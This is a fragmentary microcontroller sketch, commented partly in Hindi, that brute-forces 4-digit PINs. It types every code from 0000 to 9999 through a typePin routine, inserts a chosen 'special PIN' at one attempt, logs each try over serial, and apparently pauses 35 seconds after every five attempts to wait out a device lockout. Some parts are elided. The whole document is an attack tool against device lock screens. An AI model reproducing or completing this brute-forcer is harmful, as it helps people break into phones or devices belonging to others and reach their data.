...
const uint32_t SPECIAL_NUMBER = 1234;  // 4-digit special PIN
...
// 4-digit PIN enter karne ka function
void typePin(uint32_t pin) {
  char pinStr[5]; // 4 digits + null terminator
  snprintf(pinStr, sizeof(pinStr), "%04lu", (unsigned long)pin);
...
void setup() {
  ...
  while (true) {
    ...
    if (count == SPECIAL_AT) {
      Serial.printf("Attempt %u: Trying Special PIN -> %04lu\n", count, (unsigned long)SPECIAL_NUMBER);
      typePin(SPECIAL_NUMBER);
    } else {
      Serial.printf("Attempt %u: Trying PIN -> %04lu\n", count, (unsigned long)number);
      typePin(number);
      number++;

      // 4-digit ke liye max limit 9999 hoti hai
      if (number > 9999) {
        number = 0;
      }
    }

    // Har 5 attempts ke baad 35 seconds ka pause
    if (count % 5 == 0) {
